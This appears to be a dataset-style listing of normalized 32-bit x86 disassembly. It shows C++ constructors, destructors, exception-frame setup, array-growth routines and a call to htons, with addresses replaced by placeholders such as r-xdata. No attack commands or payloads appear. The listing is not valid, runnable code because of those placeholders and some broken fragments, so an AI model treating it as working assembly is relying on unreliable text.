mov [ esp + 0x20 ] 0x0
ja r-xdata
push [ esp + 0x20 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esp + 0x64 ] 0xf
mov [ esp + 0x60 ] 0x0
mov [ esp + 0x50 ] 0x0
jmp r-xdata
push [ esp + 0x50 ]
call j_sub_1003f3e3#2
add esp 0x4
push 0x10
push 0x0
lea eax [ esp + 0x28 ]
push eax
lea ecx [ esp + 0x44 ]
call sub_10006fa0
mov [ esp + 0xc0 ] 0x8
lea ecx [ esp + 0x38 ]
push [ esp + 0x30 ]
push 0x0
call sub_10001ae0
push 0x1
sub esp 0x18
lea eax [ esp + 0x3c ]
mov ecx esp
mov [ esp + 0x38 ] esp
push 0xffffffff
push 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] 0x0
call sub_100018b0
mov [ esp + 0xdc ] 0x9
lea ecx [ esp + 0xb4 ]
mov eax [ edi ]
push ecx
mov [ esp + 0xe0 ] 0x8
mov ecx edi
call [ eax + 0xc ]
mov [ esp + 0xc0 ] 0xa
push [ esp + 0xa8 ]
call [ htons@IAT ]
movzx eax ax
lea ecx [ esp + 0x50 ]
mov [ esp + 0x18 ] eax
lea eax [ esp + 0x18 ]
push 0x2
push eax
call sub_10005470
push 0xffffffff
push 0x0
lea eax [ esp + 0xa0 ]
push eax
lea ecx [ esp + 0x5c ]
call sub_100050b0
mov [ esp + 0xc0 ] 0x8
cmp [ esp + 0xac ] 0x10
jb r-xdata
mov eax [ edi ]
mov ecx edi
push 0x1
call [ eax ]
mov [ esp + 0xc0 ] 0x1
cmp [ esp + 0x7c ] 0x10
jb r-xdata
sub_1001c540
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f068
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x0
call sub_1001c630
mov [ ebp - 0x4 ] 0xffffffff
push [ esi ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esi ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
sub_1001c5a0
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0xc ]
mov ecx [ esi + 0x10 ]
add eax ecx
test al 0x3
jne r-xdata
mov ecx [ esi + 0x8 ]
push ebx
push edi
mov edi [ esi + 0x10 ]
lea eax [ ecx * 4 - 0x1 ]
dec ecx
and [ esi + 0xc ] eax
add edi [ esi + 0xc ]
mov eax edi
shr eax 0x2
and ecx eax
mov eax [ esi + 0x4 ]
lea ebx [ ecx * 4 ]
cmp [ ebx + eax ] 0x0
jne r-xdata
lea eax [ ecx + 0x4 ]
shr eax 0x2
cmp [ esi + 0x8 ] eax
ja r-xdata
mov eax [ esi + 0x4 ]
and edi 0x3
mov eax [ eax + ebx ]
lea ecx [ eax + edi * 4 ]
pop edi
pop ebx
test ecx ecx
je r-xdata
push 0x10
call sub_1003cdeb
mov ecx eax
add esp 0x4
test ecx ecx
je r-xdata
push ecx
mov ecx esi
call sub_1001c6d0
inc [ esi + 0x10 ]
pop esi
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
call sub_1003c58d
mov eax [ esi + 0x4 ]
mov [ ebx + eax ] ecx
sub_1001c630
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
push edi
mov edi [ esi + 0x8 ]
test edi edi
je r-xdata
lea ebx [ ebx ]
mov eax [ esi + 0x4 ]
pop edi
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
dec edi
mov eax [ eax + edi * 4 ]
test eax eax
je r-xdata
test eax eax
jne r-xdata
mov [ esi + 0xc ] eax
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
pop esi
retn
push eax
call j_sub_1003f3e3#2
add esp 0x4
test edi edi
jne r-xdata
push eax
call j_sub_1003f3e3#2
add esp 0x4
dec eax
jne r-xdata
mov [ esi + 0x10 ] eax
sub_1001c6d0
push ebp
mov ebp esp
sub esp 0x14
push ebx
mov ebx ecx
push esi
mov esi 0x1
mov [ ebp - 0x14 ] ebx
push edi
mov edx [ ebx + 0x8 ]
test edx edx
cmovne esi edx
jmp r-xdata
mov eax esi
sub eax edx
cmp eax 0x1
jb r-xdata
mov eax 0xfffffff
sub eax esi
cmp eax esi
jb r-xdata
cmp esi 0x8
jae r-xdata
push r--data
call sub_1003c5be
add esi esi
jmp r-xdata
mov edi [ ebx + 0xc ]
sub esi edx
shr edi 0x2
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x4 ] 0x0
lea eax [ edx + esi ]
test eax eax
je r-xdata
mov ecx [ ebx + 0x4 ]
lea eax [ edi * 4 ]
mov [ ebp - 0xc ] eax
lea edx [ eax + ecx ]
mov eax [ ebx + 0x8 ]
shl eax 0x2
sub eax edx
add eax ecx
sar eax 0x2
lea edi [ eax * 4 ]
mov eax [ ebp - 0xc ]
add eax [ ebp - 0x4 ]
push edi
push edx
push eax
call sub_1003c640
mov ecx [ ebx + 0x4 ]
add esp 0xc
lea edx [ edi + eax ]
mov edi [ ebp - 0x8 ]
mov [ ebp - 0x10 ] edx
cmp edi esi
ja r-xdata
cmp eax 0x3fffffff
ja r-xdata
lea edi [ esi * 4 ]
mov eax edi
and eax 0xfffffffc
push eax
push ecx
push edx
call sub_1003c640
mov eax [ ebx + 0x4 ]
mov edx [ ebp - 0xc ]
lea ecx [ edi + eax ]
sub edx ecx
add edx eax
sar edx 0x2
lea ebx [ edx * 4 ]
push ebx
push ecx
push [ ebp - 0x4 ]
call sub_1003c640
add esp 0x18
lea edi [ ebx + eax ]
mov ebx [ ebp - 0x4 ]
test esi esi
je r-xdata
lea eax [ edi * 4 ]
mov edx esi
sar eax 0x2
sub edx edi
mov [ ebp - 0xc ] edx
lea ebx [ eax * 4 ]
push ebx
push ecx
push [ ebp - 0x10 ]
call sub_1003c640
mov ecx [ ebp - 0xc ]
add esp 0xc
lea edx [ ebx + eax ]
test ecx ecx
je r-xdata
call sub_1003c58d
shl eax 0x2
push eax
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
mov edi [ ebp - 0x14 ]
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov ecx esi
mov ebx [ ebp - 0x4 ]
test edi edi
je r-xdata
xor eax eax
mov edi edx
[ edi ]
mov edi [ ebp - 0x8 ]
add [ edi + 0x8 ] esi
mov [ edi + 0x4 ] ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push eax
call j_sub_1003f3e3#2
add esp 0x4
mov ecx edi
mov edi ebx
jmp r-xdata
xor eax eax
[ edi ]
sub_1001c850
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f0a1
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
push 0x8
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
mov [ esi + 0xc ] 0x0
mov [ esi + 0x10 ] 0x0
call sub_1003cdeb
add esp 0x4
test eax eax
jne r-xdata
mov [ esi ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0x0
mov [ eax ] 0x0
mov [ eax + 0x4 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ esi ]
mov [ eax ] esi
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
call sub_1003c58d
sub_1001c910
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
lea esi [ ecx - 0x8 ]
mov [ esi ] r--data
mov ecx [ esi + 0x4 ]
mov ecx [ ecx + 0x4 ]
mov [ ecx + esi + 0x4 ] r--data
mov [ esi + 0x8 ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_1001c950
push ebp
mov ebp esp
push 0xffffffff
push sub_1004e3ab
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x14 ] 0x0
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov edx [ eax + 0x4 ]
lea eax [ edx - 0xc ]
mov [ edx + esi - 0x4 ] eax
mov [ esi + 0x4 ] 0xc
mov [ ebp - 0x4 ] 0x4
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov eax [ eax + 0x8 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x1c ]
mov [ ecx + esi - 0x4 ] eax
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x24 ]
mov [ ecx + esi - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ esi + 0xc ] eax
mov ax [ ebp + 0x10 ]
mov [ esi + 0x10 ] ax
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x10
sub_1001ca10
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f0cb
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edx ecx
mov [ ebp - 0x10 ] edx
mov eax [ edx - 0x1c ]
mov eax [ eax + 0x4 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov eax [ eax + 0x8 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x1c ]
mov [ ecx + edx - 0x20 ] eax
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x24 ]
mov [ ecx + edx - 0x20 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ edx - 0x1c ]
mov eax [ eax + 0x4 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0xc ]
mov [ ecx + edx - 0x20 ] eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_1001cae0
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x1c ]
mov ecx esi
call sub_1001cb10
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_1001cb10
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f0fb
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edx ecx
mov eax [ edx ]
lea esi [ edx + 0x1c ]
mov [ ebp - 0x10 ] esi
mov eax [ eax + 0x4 ]
mov [ eax + esi - 0x1c ] r--data
mov eax [ esi - 0x1c ]
mov eax [ eax + 0x8 ]
mov [ eax + esi - 0x1c ] r--data
mov eax [ esi - 0x1c ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x1c ]
mov [ ecx + esi - 0x20 ] eax
mov eax [ esi - 0x1c ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x24 ]
mov [ ecx + esi - 0x20 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ esi - 0x1c ]
mov eax [ eax + 0x4 ]
mov [ eax + esi - 0x1c ] r--data
mov eax [ esi - 0x1c ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0xc ]
mov [ ecx + esi - 0x20 ] eax
mov eax [ edx + 0x28 ]
mov [ edx + 0x24 ] r--data
mov eax [ eax + 0x4 ]
mov [ eax + edx + 0x28 ] r--data
mov [ esi ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
sub_1001cbc0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f174
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x14 ] r--data
mov [ esi + 0x18 ] r--data
mov [ esi + 0x8 ] r--data
mov [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0x10 ]
mov eax [ ecx + 0x4 ]
mov [ ecx ] r--data
mov [ ebp - 0x10 ] 0x1
mov [ ebp - 0x18 ] ecx
mov eax [ eax + 0x4 ]
mov [ eax + ecx + 0x4 ] r--data
mov [ ebp - 0x4 ] 0x2
push ecx
push 0x1
push [ ebp + 0xc ]
lea ecx [ esi + 0x18 ]
mov [ ebp - 0x10 ] 0x3
push [ ebp + 0x8 ]
call sub_1001c950
mov [ ebp - 0x4 ] 0x3
mov eax [ esi ]
mov [ ebp - 0x10 ] 0x7
mov eax [ eax + 0x4 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov eax [ eax + 0x8 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x8 ]
mov [ ecx + esi - 0x4 ] eax
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x10 ]
mov [ ecx + esi - 0x4 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0xc
sub_1001ccb0
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x8 ]
mov ecx esi
call sub_1001cce0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_1001cce0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f0fb
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov eax [ esi ]
lea edx [ esi + 0x34 ]
mov [ ebp - 0x10 ] edx
mov eax [ eax + 0x4 ]
mov [ eax + esi ] r--data
mov eax [ esi ]
mov eax [ eax + 0x8 ]
mov [ eax + esi ] r--data
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x8 ]
mov [ ecx + esi - 0x4 ] eax
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x10 ]
mov [ ecx + esi - 0x4 ] eax
mov eax [ edx - 0x1c ]
mov eax [ eax + 0x4 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov eax [ eax + 0x8 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x1c ]
mov [ ecx + edx - 0x20 ] eax
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x24 ]
mov [ ecx + edx - 0x20 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ edx - 0x1c ]
mov eax [ eax + 0x4 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0xc ]
mov [ ecx + edx - 0x20 ] eax
mov eax [ esi + 0x14 ]
mov [ esi + 0x10 ] r--data
mov eax [ eax + 0x4 ]
mov [ eax + esi + 0x14 ] r--data
mov [ esi + 0x8 ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
sub_1001cdc0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f1f7
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov eax [ eax + 0x8 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x20 ]
mov [ ecx + esi - 0x4 ] eax
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x28 ]
mov [ ecx + esi - 0x4 ] eax
lea ecx [ esi + 0x4 ]
xor eax eax
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
mov [ ecx ] ax
mov [ ebp - 0x4 ] 0x5
lea eax [ ebp + 0x14 ]
cmp ecx eax
je r-xdata
mov [ esi ] r--data
mov [ esi + 0x2c ] r--data
mov [ esi + 0x30 ] r--data
mov [ esi + 0x20 ] r--data
mov [ ebp - 0x4 ] 0x1
lea ecx [ esi + 0x28 ]
mov eax [ ecx + 0x4 ]
mov [ ecx ] r--data
mov [ ebp - 0x10 ] 0x1
mov [ ebp - 0x18 ] ecx
mov eax [ eax + 0x4 ]
mov [ eax + ecx + 0x4 ] r--data
mov [ ebp - 0x4 ] 0x3
push ecx
push 0x2
push [ ebp + 0xc ]
lea ecx [ esi + 0x30 ]
mov [ ebp - 0x10 ] 0x3
push [ ebp + 0x8 ]
call sub_1001c950
mov [ ebp - 0x4 ] 0x4
mov [ ebp - 0x10 ] 0x7
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x28 ] 0x8
jb r-xdata
push 0xffffffff
push 0x0
push eax
call sub_10003a20
xor eax eax
mov [ ebp + 0x28 ] 0x7
mov [ ebp + 0x14 ] ax
mov eax esi
mov [ ebp + 0x24 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x24
push [ ebp + 0x14 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_1001cf10
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f22b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ esi - 0x20 ]
mov eax [ eax + 0x4 ]
mov [ eax + esi - 0x20 ] r--data
mov eax [ esi - 0x20 ]
mov eax [ eax + 0x8 ]
mov [ eax + esi - 0x20 ] r--data
mov eax [ esi - 0x20 ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x20 ]
mov [ ecx + esi - 0x24 ] eax
mov eax [ esi - 0x20 ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x28 ]
mov [ ecx + esi - 0x24 ] eax
mov [ ebp - 0x4 ] 0xffffffff
cmp [ esi - 0x8 ] 0x8
jb r-xdata
xor eax eax
mov [ esi - 0x8 ] 0x7
mov [ esi - 0xc ] 0x0
mov [ esi - 0x1c ] ax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push [ esi - 0x1c ]
call j_sub_1003f3e3#2
add esp 0x4
sub_1001cfb0
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x20 ]
mov ecx esi
call sub_1001cfe0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_1001cfe0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f25b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
lea ecx [ esi + 0x20 ]
call sub_1001cf10
mov eax [ esi + 0x30 ]
lea edx [ esi + 0x4c ]
mov [ ebp - 0x10 ] edx
mov eax [ eax + 0x4 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov eax [ eax + 0x8 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x1c ]
mov [ ecx + edx - 0x20 ] eax
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x24 ]
mov [ ecx + edx - 0x20 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ edx - 0x1c ]
mov eax [ eax + 0x4 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0xc ]
mov [ ecx + edx - 0x20 ] eax
mov eax [ esi + 0x2c ]
mov [ esi + 0x28 ] r--data
mov eax [ eax + 0x4 ]
mov [ eax + esi + 0x2c ] r--data
mov [ esi + 0x20 ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_1001d0a0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f174
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x14 ] r--data
mov [ esi + 0x18 ] r--data
mov [ esi + 0x8 ] r--data
mov [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0x10 ]
mov eax [ ecx + 0x4 ]
mov [ ecx ] r--data
mov [ ebp - 0x10 ] 0x1
mov [ ebp - 0x18 ] ecx
mov eax [ eax + 0x4 ]
mov [ eax + ecx + 0x4 ] r--data
mov [ ebp - 0x4 ] 0x2
push ecx
push 0x12
push [ ebp + 0xc ]
lea ecx [ esi + 0x18 ]
mov [ ebp - 0x10 ] 0x3
push [ ebp + 0x8 ]
call sub_1001c950
mov [ ebp - 0x4 ] 0x3
mov eax [ esi ]
mov [ ebp - 0x10 ] 0x7
mov eax [ eax + 0x4 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov eax [ eax + 0x8 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x8 ]
mov [ ecx + esi - 0x4 ] eax
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x10 ]
mov [ ecx + esi - 0x4 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0xc
sub_1001d190
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x8 ]
mov ecx esi
call sub_1001d1c0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_1001d1c0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f0fb
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov eax [ esi ]
lea edx [ esi + 0x34 ]
mov [ ebp - 0x10 ] edx
mov eax [ eax + 0x4 ]
mov [ eax + esi ] r--data
mov eax [ esi ]
mov eax [ eax + 0x8 ]
mov [ eax + esi ] r--data
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x8 ]
mov [ ecx + esi - 0x4 ] eax
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x10 ]
mov [ ecx + esi - 0x4 ] eax
mov eax [ edx - 0x1c ]
mov eax [ eax + 0x4 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov eax [ eax + 0x8 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x1c ]
mov [ ecx + edx - 0x20 ] eax
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x24 ]
mov [ ecx + edx - 0x20 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ edx - 0x1c ]
mov eax [ eax + 0x4 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0xc ]
mov [ ecx + edx - 0x20 ] eax
mov eax [ esi + 0x14 ]
mov [ esi + 0x10 ] r--data
mov eax [ eax + 0x4 ]
mov [ eax + esi + 0x14 ] r--data
mov [ esi + 0x8 ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
sub_1001d2a0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f174
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x14 ] r--data
mov [ esi + 0x18 ] r--data
mov [ esi + 0x8 ] r--data
mov [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0x10 ]
mov eax [ ecx + 0x4 ]
mov [ ecx ] r--data
mov [ ebp - 0x10 ] 0x1
mov [ ebp - 0x18 ] ecx
mov eax [ eax + 0x4 ]
mov [ eax + ecx + 0x4 ] r--data
mov [ ebp - 0x4 ] 0x2
push ecx
push 0x3
push [ ebp + 0xc ]
lea ecx [ esi + 0x18 ]
mov [ ebp - 0x10 ] 0x3
push [ ebp + 0x8 ]
call sub_1001c950
mov [ ebp - 0x4 ] 0x3
mov eax [ esi ]
mov [ ebp - 0x10 ] 0x7
mov eax [ eax + 0x4 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov eax [ eax + 0x8 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x8 ]
mov [ ecx + esi - 0x4 ] eax
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x10 ]
mov [ ecx + esi - 0x4 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0xc
sub_1001d390
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x8 ]
mov ecx esi
call sub_1001d3c0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_1001d3c0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f0fb
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov eax [ esi ]
lea edx [ esi + 0x34 ]
mov [ ebp - 0x10 ] edx
mov eax [ eax + 0x4 ]
mov [ eax + esi ] r--data
mov eax [ esi ]
mov eax [ eax + 0x8 ]
mov [ eax + esi ] r--data
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x8 ]
mov [ ecx + esi - 0x4 ] eax
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x10 ]
mov [ ecx + esi - 0x4 ] eax
mov eax [ edx - 0x1c ]
mov eax [ eax + 0x4 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov eax [ eax + 0x8 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x1c ]
mov [ ecx + edx - 0x20 ] eax
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x24 ]
mov [ ecx + edx - 0x20 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ edx - 0x1c ]
mov eax [ eax + 0x4 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0xc ]
mov [ ecx + edx - 0x20 ] eax
mov eax [ esi + 0x14 ]
mov [ esi + 0x10 ] r--data
mov eax [ eax + 0x4 ]
mov [ eax + esi + 0x14 ] r--data
